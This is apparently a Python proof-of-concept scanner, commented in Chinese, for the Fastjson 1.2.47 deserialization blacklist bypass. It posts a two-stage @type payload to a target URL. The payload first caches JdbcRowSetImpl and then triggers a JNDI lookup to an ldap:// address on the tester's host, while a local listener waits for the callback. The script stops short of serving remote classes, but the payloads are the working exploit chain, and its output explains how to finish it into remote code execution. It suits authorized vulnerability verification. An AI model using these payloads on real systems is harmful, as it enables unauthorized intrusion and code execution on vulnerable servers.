#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Fastjson 1.2.47 反序列化白名单绕过 (无 CVE 编号) 非破坏性验证 PoC

原理: 先用 java.lang.Class 把 JdbcRowSetImpl 塞进 fastjson 的类缓存,
      再用 @type 引用它, 绕过 1.2.25~1.2.47 的黑名单; 该类的 setAutoCommit
      会以 dataSourceName 发起 JNDI 查询, 从而触发外连。

只判断目标是否发起外连, 不提供 LDAP/RMI 服务, 不加载远程类, 不执行命令。
零依赖: 仅使用 Python 标准库。
"""
import argparse
import json
import socket
import ssl
import sys
import threading
import time
import urllib.error
import urllib.request
from urllib.parse import urlparse

EXIT_VULN = 0
EXIT_SAFE = 1
EXIT_ERROR = 2


def detect_lhost(target_host):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect((target_host, 80))
        ip = sock.getsockname()[0]
        sock.close()
        return ip
    except Exception:
        return "127.0.0.1"


class Listener(threading.Thread):
    """只接受 TCP 连接并记录来源 IP, 不实现任何 LDAP 协议。"""

    def __init__(self, lport, wait):
        threading.Thread.__init__(self)
        self.daemon = True
        self.lport = lport
        self.wait = wait
        self.hits = []
        self.error = None
        self._stop_evt = threading.Event()

    def run(self):
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            srv.bind(("0.0.0.0", self.lport))
            srv.listen(5)
            srv.settimeout(1.0)
        except OSError as exc:
            self.error = exc
            return
        deadline = time.time() + self.wait
        while time.time() < deadline and not self._stop_evt.is_set():
            try:
                conn, addr = srv.accept()
                self.hits.append(addr[0])
                conn.close()
            except socket.timeout:
                continue
            except Exception:
                break
        srv.close()

    def stop(self):
        self._stop_evt.set()


def post(url, payload, timeout, insecure):
    req = urllib.request.Request(
        url,
        data=json.dumps(payload).encode(),
        headers={"Content-Type": "application/json",
                 "User-Agent": "poc-fastjson-1.2.47/1.0"},
        method="POST",
    )
    ctx = None
    if insecure:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    try:
        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        return resp.status, resp.read(400).decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read(400).decode("utf-8", "replace")
    except Exception as exc:
        return None, str(exc)


def stage_class():
    """第一步: 把目标类加载进 fastjson 的缓存 (绕过黑名单)。"""
    return {"user": {"@type": "java.lang.Class",
                     "val": "com.sun.rowset.JdbcRowSetImpl"}}


def stage_jndi(lhost, lport):
    """第二步: 引用缓存中的类, 触发 JNDI 查询。"""
    return {"user": {"@type": "com.sun.rowset.JdbcRowSetImpl",
                     "dataSourceName": "ldap://%s:%d/Exploit" % (lhost, lport),
                     "autoCommit": True}}


def main():
    ap = argparse.ArgumentParser(
        description="Fastjson 1.2.47 反序列化绕过 (无 CVE) 非破坏性验证")
    ap.add_argument("-u", "--url", required=True,
                    help="目标 URL, 如 http://1.2.3.4:8090/")
    ap.add_argument("--lhost", default=None,
                    help="目标可回连的本机 IP, 默认自动探测")
    ap.add_argument("--lport", type=int, default=1389,
                    help="本地监听端口, 默认 1389")
    ap.add_argument("-t", "--timeout", type=float, default=8.0,
                    help="请求超时秒数, 默认 8")
    ap.add_argument("-w", "--wait", type=float, default=14.0,
                    help="等待回调秒数, 默认 14")
    ap.add_argument("-k", "--insecure", action="store_true",
                    help="跳过 TLS 证书校验")
    args = ap.parse_args()

    host = urlparse(args.url).hostname
    if not host:
        print("[结论]    ERROR URL 无法解析")
        return EXIT_ERROR
    lhost = args.lhost or detect_lhost(host)

    s1 = stage_class()
    s2 = stage_jndi(lhost, args.lport)

    print("[目标]    %s" % args.url)
    print("[注入点]  JSON 请求体 user.@type (两段式: 类缓存 -> JNDI 实例化)")
    print("[Payload] step1 %s" % json.dumps(s1, ensure_ascii=False))
    print("          step2 %s" % json.dumps(s2, ensure_ascii=False))
    print("[监听]    %s:%d (等待目标 JNDI 外连)" % (lhost, args.lport))

    listener = Listener(args.lport, args.wait)
    listener.start()
    time.sleep(0.5)
    if listener.error is not None:
        print("[响应]    -")
        print("[结论]    ERROR 本地端口无法监听: %s" % listener.error)
        return EXIT_ERROR

    st1, body1 = post(args.url, s1, args.timeout, args.insecure)
    if st1 is None:
        print("[响应]    请求失败: %s" % body1)
        print("[结论]    ERROR 目标不可达")
        listener.stop()
        return EXIT_ERROR
    print("[响应]    step1 HTTP %s, body: %s" %
          (st1, " ".join(body1.split())[:120]))

    time.sleep(0.6)
    st2, body2 = post(args.url, s2, args.timeout, args.insecure)
    if st2 is None:
        print("[响应]    step2 请求失败: %s" % body2)
        print("[结论]    ERROR 目标不可达")
        listener.stop()
        return EXIT_ERROR
    print("[响应]    step2 HTTP %s, body: %s" %
          (st2, " ".join(body2.split())[:160]))

    listener.join()

    if listener.hits:
        print("[回调]    %s -> %s:%d 连接成功" %
              (", ".join(listener.hits), lhost, args.lport))
        print("[结论]    VULNERABLE - Fastjson 1.2.47 反序列化绕过 (无 CVE 编号)")
        print("[原理]    Fastjson 1.2.25 起用黑名单限制 autoType, 但 1.2.48 之前")
        print("          可通过 @type=java.lang.Class 把目标类预先加载进内部")
        print("          缓存, 再用 @type 引用, 绕过黑名单校验。JdbcRowSetImpl")
        print("          的 setAutoCommit 会用 dataSourceName 发起 JNDI 查询,")
        print("          指向攻击者的 LDAP/RMI 服务即可加载远程类执行命令。")
        print("          本脚本只验证外连, 不加载远程类。")
        return EXIT_VULN

    print("[回调]    未收到连接")
    print("[结论]    NOT VULNERABLE - 目标未发起 JNDI 外连")
    print("[说明]    若目标为 400/500 且提示 autoType is not support,")
    print("          可能已升级到 1.2.48+ 或开启了 safeMode。")
    return EXIT_SAFE


if __name__ == "__main__":
    sys.exit(main())
